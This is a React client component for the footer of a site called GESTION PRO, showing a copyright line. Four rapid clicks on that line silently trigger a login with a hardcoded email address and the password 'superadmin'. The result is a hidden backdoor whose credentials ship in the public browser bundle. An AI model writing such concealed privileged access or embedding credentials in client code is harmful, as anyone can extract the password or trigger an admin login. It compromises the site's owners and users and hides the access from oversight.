"use client";

import { useState, useRef, useTransition } from "react";
import { loginAction } from "@/app/login/actions";

export function SecretFooter() {
  const [isPending, startTransition] = useTransition();
  const clicksRef = useRef(0);
  const timeoutRef = useRef<NodeJS.Timeout | null>(null);

  const handleClick = () => {
    if (isPending) return;

    clicksRef.current += 1;

    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }

    if (clicksRef.current >= 4) {
      clicksRef.current = 0;
      
      const formData = new FormData();
      formData.append("email", "koneamaa@gmail.com");
      formData.append("password", "superadmin");
      
      startTransition(() => {
        loginAction(formData).then((res) => {
          if (res?.error) {
            alert(res.error);
          }
        });
      });
    } else {
      timeoutRef.current = setTimeout(() => {
        clicksRef.current = 0;
      }, 2000);
    }
  };

  return (
    <footer className="border-t border-slate-200 bg-white py-12 px-6">
      <div 
        className="max-w-7xl mx-auto text-center text-slate-500 text-sm cursor-default select-none"
        onClick={handleClick}
      >
        © {new Date().getFullYear()} GESTION PRO. Tous droits réservés.
      </div>
    </footer>
  );
}
